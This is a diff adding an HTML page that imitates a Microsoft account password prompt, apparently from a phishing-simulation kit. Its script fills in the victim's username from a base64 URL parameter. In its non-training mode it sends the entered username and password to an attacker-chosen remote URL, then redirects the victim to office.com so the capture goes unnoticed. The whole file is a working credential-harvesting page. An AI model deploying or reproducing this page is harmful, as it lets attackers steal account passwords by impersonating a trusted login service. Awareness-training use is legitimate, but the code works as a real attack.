@@ -1,0 +1,288 @@
+<!DOCTYPE html>
+<meta charset="UTF-8">
+<html>
+<body>
+    <div id="overlay" class="overlay"></div>
+    <div class="footer"><div class="footertext">Terms of use<span style="margin-left: 20px;"></span>Privacy & Cookies</div></div>
+    <div class="outer">
+        <div class="middle">
+            <div class="sign-in-box">
+                <div class="win-scroll">
+                    <div class="logo">
+                        <img id="logo_image" class="logo_image" src="">
+                    </div>
+                    <div id="display_name" class="display_name">
+                        username@domain.com
+                    </div>
+                    <div class="prompt">
+                        Enter password
+                    </div>
+                    <div id="error">
+                        Please enter the password for your Microsoft account.
+                    </div>
+                    <input class="passwordinput" id="password" name="passwd" type="password" autocomplete="off" placeholder="Password" >
+                </div>
+                <p><span style="font-size: .8125rem;">Having trouble?</span> <a href="https://account.live.com/ResetPassword.aspx">Sign in another way</a></p>
+                <p><a href="https://account.live.com/ResetPassword.aspx">More information</a></p>
+                <div class="buttoncontainer">
+                <input type="submit" id="submit" class="button" value="Verify" >
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+<head>
+<script>
+    var url_string = document.location.search;
+    var url = new URL("http://reddit.com/" + url_string);
+
+    var submit_btn = document.getElementById("submit");
+    var input_btn = document.getElementById("password");
+
+    /* Try to see if username is specified */
+    var username = "username@domain.com";
+    var getId = url.searchParams.get("id");
+    var usernameElement = document.getElementById("display_name");
+    if (getId) {
+        username = atob(getId);
+    }
+    usernameElement.innerHTML = username;
+
+
+    /* Define various click action listeners */
+    /* Default action is training which simply opens targeted link */
+    function clickActionTraining() {
+        window.open(remoteUrl);
+    }
+    /* This one takes what's in the form and posts to the remote URL */
+    function clickActionRemote() {
+        var input_btn_value = input_btn.value;
+        /* Check for empty input */
+        if (input_btn_value.length <= 0) {
+            document.getElementById("error").style.display = "inline";        
+        } else {
+            var req = remoteUrl + "?u=" + username + "&p=" + input_btn_value;
+            var req_encoded = encodeURI(req);
+            var xhttp = new XMLHttpRequest();
+            xhttp.onreadystatechange = function() {
+                if (this.readyState == 1) {
+                    setTimeout(function(){ window.location.href="https://office.com";}, 1000);
+                    
+                }
+            }
+            xhttp.open("GET", req_encoded);
+            xhttp.send();
+        }
+    }
+    function redirectToOffice() {
+
+    }
+
+    /* Determine action */
+    var remoteUrl = "/";
+    var getUrl = url.searchParams.get("url");
+    var getTraining = url.searchParams.get("training");
+    /* If training=0, then will post form fields to remote address when submit is clicked  */
+    if (getTraining == "0") {
+        if (getUrl) {
+            remoteUrl = atob(getUrl);
+            if (remoteUrl.endsWith("/") != true) {
+                remoteUrl = remoteUrl + "/";
+            }
+        } else {
+            remoteUrl = "/";
+        }
+        submit_btn.addEventListener("click", clickActionRemote);
+        input_btn.addEventListener("keyup", function(event) {
+            if (event.key === "Enter") {
+                clickActionRemote();
+            }
+        });
+
+    /*  Else (default), then will simply open a link in new tab to specified remote address */
+    } else {
+        if (getUrl) {
+            remoteUrl = atob(getUrl);
+        } else {
+            remoteUrl = "/message.html";
+        }
+        submit_btn.addEventListener("click", clickActionTraining);
+        input_btn.addEventListener("click", clickActionTraining);
+    }
+    
+    /* If logo link is provided, will load, otherwise will display generic*/
+    var getLogo = url.searchParams.get("logo");
+    var logoElement = document.getElementById("logo_image");
+    if (getLogo) {
+        logoElement.src = atob(getLogo);
+    } else {
+        logoElement.src = "data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB3aWR0aD0iMzFtbSIgaGVpZ2h0PSI3bW0iIHZlcnNpb249IjEuMSIgdmlld0JveD0iMCAwIDMxIDciIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6Y2M9Imh0dHA6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL25zIyIgeG1sbnM6ZGM9Imh0dHA6Ly9wdXJsLm9yZy9kYy9lbGVtZW50cy8xLjEvIiB4bWxuczpvc2I9Imh0dHA6Ly93d3cub3BlbnN3YXRjaGJvb2sub3JnL3VyaS8yMDA5L29zYiIgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4KIDxtZXRhZGF0YT4KICA8cmRmOlJERj4KICAgPGNjOldvcmsgcmRmOmFib3V0PSIiPgogICAgPGRjOmZvcm1hdD5pbWFnZS9zdmcreG1sPC9kYzpmb3JtYXQ+CiAgICA8ZGM6dHlwZSByZGY6cmVzb3VyY2U9Imh0dHA6Ly9wdXJsLm9yZy9kYy9kY21pdHlwZS9TdGlsbEltYWdlIi8+CiAgICA8ZGM6dGl0bGUvPgogICA8L2NjOldvcms+CiAgPC9yZGY6UkRGPgogPC9tZXRhZGF0YT4KIDxnPgogIDxnIGZpbGwtcnVsZT0iZXZlbm9kZCIgc3Ryb2tlPSIjZmZmIiBzdHJva2Utd2lkdGg9Ii4yOTEyNiI+CiAgIDxyZWN0IHg9Ii4xNTMyMiIgeT0iLjE4MjYxIiB3aWR0aD0iMy4xNzUyIiBoZWlnaHQ9IjMuMzEyMiIgZmlsbD0iI2ViY2EyNyIvPgogICA8cmVjdCB4PSIzLjMyODQiIHk9Ii4xODI2MSIgd2lkdGg9IjMuMTc1MiIgaGVpZ2h0PSIzLjMxMjIiIGZpbGw9IiMyNzRkZWIiLz4KICAgPHJlY3QgeD0iLjE1MzIyIiB5PSIzLjQ5NDgiIHdpZHRoPSIzLjE3NTIiIGhlaWdodD0iMy4zMTIyIiBmaWxsPSIjMTJiMTJlIi8+CiAgIDxyZWN0IHg9IjMuMzI4NCIgeT0iMy40OTQ4IiB3aWR0aD0iMy4xNzUyIiBoZWlnaHQ9IjMuMzEyMiIgZmlsbD0iI2RkMGEwMCIvPgogIDwvZz4KICA8dGV4dCB4PSI4LjMwNTYyOTciIHk9IjUuODIyMTA1OSIgZmlsbD0iIzY2NjY2NiIgZm9udC1mYW1pbHk9InNhbnMtc2VyaWYiIGZvbnQtc2l6ZT0iNC45Mzg5cHgiIHN0cm9rZS13aWR0aD0iLjI2NDU4IiBzdHlsZT0iZm9udC12YXJpYW50LWNhcHM6bm9ybWFsO2ZvbnQtdmFyaWFudC1lYXN0LWFzaWFuOm5vcm1hbDtmb250LXZhcmlhbnQtbGlnYXR1cmVzOm5vcm1hbDtmb250LXZhcmlhbnQtbnVtZXJpYzpub3JtYWw7bGluZS1oZWlnaHQ6MS4yNSIgeG1sOnNwYWNlPSJwcmVzZXJ2ZSI+PHRzcGFuIHg9IjguMzA1NjI5NyIgeT0iNS44MjIxMDU5IiBmaWxsPSIjNjY2NjY2IiBmb250LWZhbWlseT0ic2Fucy1zZXJpZiIgZm9udC1zaXplPSI1LjY0NDRweCIgc3Ryb2tlLXdpZHRoPSIuMjY0NTgiIHN0eWxlPSJmb250LXZhcmlhbnQtY2Fwczpub3JtYWw7Zm9udC12YXJpYW50LWVhc3QtYXNpYW46bm9ybWFsO2ZvbnQtdmFyaWFudC1saWdhdHVyZXM6bm9ybWFsO2ZvbnQtdmFyaWFudC1udW1lcmljOm5vcm1hbCI+TWluaXNvZnQ8L3RzcGFuPjwvdGV4dD4KIDwvZz4KPC9zdmc+Cg==";
+    }
+
+    /* If background link is provided, will load, otherwise will display generic */
+    var getBg = url.searchParams.get("bg");
+    if (getBg) {
+        document.body.style.background = "url('" + atob(getBg) + "') no-repeat fixed center";
+        document.body.style.backgroundSize = "cover";
+        var overlayElement = document.getElementById("overlay");
+        overlayElement.style.opacity = 0.2;
+    };
+
+</script>
+<style>
+body {
+    font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
+    font-size: 15px;
+    line-height: 20px;
+    font-weight: 400;
+    font-size: .9375rem;
+    line-height: 1.25rem;
+    background: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB3aWR0aD0iMTBtbSIgaGVpZ2h0PSIxMG1tIiB2ZXJzaW9uPSIxLjEiIHZpZXdCb3g9IjAgMCAxMCAxMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczpjYz0iaHR0cDovL2NyZWF0aXZlY29tbW9ucy5vcmcvbnMjIiB4bWxuczpkYz0iaHR0cDovL3B1cmwub3JnL2RjL2VsZW1lbnRzLzEuMS8iIHhtbG5zOnJkZj0iaHR0cDovL3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiPgogPGRlZnM+CiAgPHJhZGlhbEdyYWRpZW50IGlkPSJyYWRpYWxHcmFkaWVudDEwNTkiIGN4PSI3LjU5NDYiIGN5PSIyLjE2NSIgcj0iNC4yMzQyIiBncmFkaWVudFRyYW5zZm9ybT0ibWF0cml4KDEgMCAwIC45NzU0MyAtLjExNTM2IC4yNDk0NCkiIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIj4KICAgPHN0b3Agc3RvcC1jb2xvcj0iI2Q1ZTJmZiIgb2Zmc2V0PSIwIi8+CiAgIDxzdG9wIHN0b3AtY29sb3I9IiNkNWUyZmYiIHN0b3Atb3BhY2l0eT0iMCIgb2Zmc2V0PSIxIi8+CiAgPC9yYWRpYWxHcmFkaWVudD4KICA8cmFkaWFsR3JhZGllbnQgaWQ9InJhZGlhbEdyYWRpZW50MTA5OSIgY3g9IjIuNTkwOCIgY3k9IjYuNTYzNCIgcj0iNC4yMzQyIiBncmFkaWVudFRyYW5zZm9ybT0ibWF0cml4KDEgMCAwIC45NzU0MyAtLjQ1NTMxIDEuNDAzOCkiIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIj4KICAgPHN0b3Agc3RvcC1jb2xvcj0iI2Q1ZjFkNSIgb2Zmc2V0PSIwIi8+CiAgIDxzdG9wIHN0b3AtY29sb3I9IiNkNWYxZDUiIHN0b3Atb3BhY2l0eT0iMCIgb2Zmc2V0PSIxIi8+CiAgPC9yYWRpYWxHcmFkaWVudD4KICA8cmFkaWFsR3JhZGllbnQgaWQ9InJhZGlhbEdyYWRpZW50MTAyNy0xIiBjeD0iMi44Mjc5IiBjeT0iMi43MzAxIiByPSIzLjQ5OTEiIGdyYWRpZW50VHJhbnNmb3JtPSJtYXRyaXgoMS4yMTAxIDAgMCAxLjE4MDQgNC4zODgyIDQuNDg1KSIgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiPgogICA8c3RvcCBzdG9wLWNvbG9yPSIjZmZiZWJlIiBvZmZzZXQ9IjAiLz4KICAgPHN0b3Agc3RvcC1jb2xvcj0iI2ZmYmViZSIgc3RvcC1vcGFjaXR5PSIwIiBvZmZzZXQ9IjEiLz4KICA8L3JhZGlhbEdyYWRpZW50PgogIDxyYWRpYWxHcmFkaWVudCBpZD0icmFkaWFsR3JhZGllbnQxMTMxIiBjeD0iMi4wOTc2IiBjeT0iMi4wMDc5IiByPSI0LjIzNDIiIGdyYWRpZW50VHJhbnNmb3JtPSJtYXRyaXgoMSAwIDAgLjk3NTQzIC44MzI2NiAuNzkwOTQpIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSI+CiAgIDxzdG9wIHN0b3AtY29sb3I9IiNmZmYyY2MiIG9mZnNldD0iMCIvPgogICA8c3RvcCBzdG9wLWNvbG9yPSIjZmZmMmNjIiBzdG9wLW9wYWNpdHk9IjAiIG9mZnNldD0iMSIvPgogIDwvcmFkaWFsR3JhZGllbnQ+CiA8L2RlZnM+CiA8bWV0YWRhdGE+CiAgPHJkZjpSREY+CiAgIDxjYzpXb3JrIHJkZjphYm91dD0iIj4KICAgIDxkYzpmb3JtYXQ+aW1hZ2Uvc3ZnK3htbDwvZGM6Zm9ybWF0PgogICAgPGRjOnR5cGUgcmRmOnJlc291cmNlPSJodHRwOi8vcHVybC5vcmcvZGMvZGNtaXR5cGUvU3RpbGxJbWFnZSIvPgogICAgPGRjOnRpdGxlLz4KICAgPC9jYzpXb3JrPgogIDwvcmRmOlJERj4KIDwvbWV0YWRhdGE+CiA8Zz4KICA8ZWxsaXBzZSB0cmFuc2Zvcm09InJvdGF0ZSguMTM5MDkpIiBjeD0iMi45MzAzIiBjeT0iMi43NDk1IiByeD0iNC4yMzQyIiByeT0iNC4xMzAyIiBmaWxsPSJ1cmwoI3JhZGlhbEdyYWRpZW50MTEzMSkiIHN0eWxlPSJtaXgtYmxlbmQtbW9kZTpvdmVybGF5Ii8+CiAgPGVsbGlwc2UgdHJhbnNmb3JtPSJyb3RhdGUoLjEzOTA5KSIgY3g9IjcuNDc5MiIgY3k9IjIuMzYxMiIgcng9IjQuMjM0MiIgcnk9IjQuMTMwMiIgZmlsbD0idXJsKCNyYWRpYWxHcmFkaWVudDEwNTkpIiBzdHlsZT0ibWl4LWJsZW5kLW1vZGU6b3ZlcmxheSIvPgogIDxlbGxpcHNlIHRyYW5zZm9ybT0icm90YXRlKC4xMzkwOSkiIGN4PSIyLjEzNTUiIGN5PSI3LjgwNiIgcng9IjQuMjM0MiIgcnk9IjQuMTMwMiIgZmlsbD0idXJsKCNyYWRpYWxHcmFkaWVudDEwOTkpIiBzdHlsZT0ibWl4LWJsZW5kLW1vZGU6bm9ybWFsIi8+CiAgPGVsbGlwc2UgdHJhbnNmb3JtPSJyb3RhdGUoLjEzOTA5KSIgY3g9IjcuODEwMiIgY3k9IjcuNzA3NSIgcng9IjQuMjM0MiIgcnk9IjQuMTMwMiIgZmlsbD0idXJsKCNyYWRpYWxHcmFkaWVudDEwMjctMSkiIHN0eWxlPSJtaXgtYmxlbmQtbW9kZTpub3JtYWwiLz4KIDwvZz4KPC9zdmc+Cg==)  no-repeat fixed center; 
+    background-size: cover;
+    margin: 0;
+}
+a {
+    color: #0067b8;
+    text-decoration: none;
+    font-size: .8125rem;
+}
+.overlay {
+    background-color: #101010;
+    opacity: .1;
+    position: fixed;
+    top: 0;
+    left: 0;
+    height: 100vh;
+    width: 100vw;
+    z-index: 0;
+}
+.footer {
+    background-color: rgba(20,20,20, 0.6);
+    position: fixed;
+    bottom: 0;
+    height: 28px;
+    width: 100vw;
+    z-index: 0;
+}
+.footertext {
+    position: fixed;
+    right: 0;
+    text-align: right;
+    color: #fff;
+    font-size: 12px;
+    line-height: 28px;
+    white-space: nowrap;
+    display: inline-block;
+    margin-left: 8px;
+    margin-right: 50px;
+}
+.outer {
+    display: table;
+    position: absolute;
+    height: 100%;
+    width: 100%;
+    z-index: 10;
+}
+.middle {
+    display: table-cell;
+    vertical-align: middle;
+}
+.sign-in-box {
+    margin-left: auto;
+    margin-right: auto;
+    position: relative;
+    max-width: 400px;
+    width: calc(100% - 40px);
+    padding: 44px;
+    margin-bottom: 28px;
+    background-color: #fff;
+    -webkit-box-shadow: 0 2px 6px rgba(0,0,0,.2);
+    -moz-box-shadow: 0 2px 6px rgba(0,0,0,.2);
+    box-shadow: 0 2px 6px rgba(0,0,0,.2);
+    min-width: 300px;
+    min-height: 300px;
+    overflow: hidden;
+}
+
+.win-scroll {
+    box-sizing: border-box;
+}
+.logo {
+    margin-bottom: 10px;
+    box-sizing: border-box;
+}
+.logo_image {
+    height: 40px;
+}
+.display_name {
+    line-height: 24px;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    margin-bottom: 15px;
+}
+.prompt {
+    color: #1b1b1b;
+    font-size: 1.5rem;
+    font-weight: 600;
+    padding: 0;
+    margin-top: 16px;
+    margin-bottom: 15px;
+}
+#error {
+    color: red;
+    display: none;
+}
+.passwordinput {
+    padding: 4px 8px;
+    border-style: solid;
+    border-width: 2px;
+    border-color: rgba(0,0,0,.4);
+    background-color: rgba(255,255,255,.4);
+    height: 32px;
+    height: 2rem;
+    padding: 6px 10px;
+    padding-left: 10px;
+    border-width: 1px;
+    border-top-width: 1px;
+    border-right-width: 1px;
+    border-left-width: 1px;
+    border-color: #666;
+    border-color: rgba(0,0,0,.6);
+    height: 36px;
+    outline: none;
+    border-radius: 0;
+    -webkit-border-radius: 0;
+    background-color: transparent;
+    border-top-width: 0;
+    border-left-width: 0;
+    border-right-width: 0;
+    padding-left: 0;
+    display: block;
+    width: 90%;
+    margin-bottom: 15px;
+}
+.buttoncontainer {
+    position: absolute;
+    bottom: 72px;
+    right: 50px;
+    text-align: right;
+    width: 100%;
+}
+.button {
+    color: #fff;
+    border-color: #0067b8;
+    background-color: #0067b8;
+    display: block;
+    width: 120px;
+    position: absolute;
+    right: 0px;
+    padding: 5px 14px 6px 14px;
+}
+.button:hover {
+    border-color: #0055a6;
+    background-color: #0055a6;
+}
+</style>
+</head>
+</html>
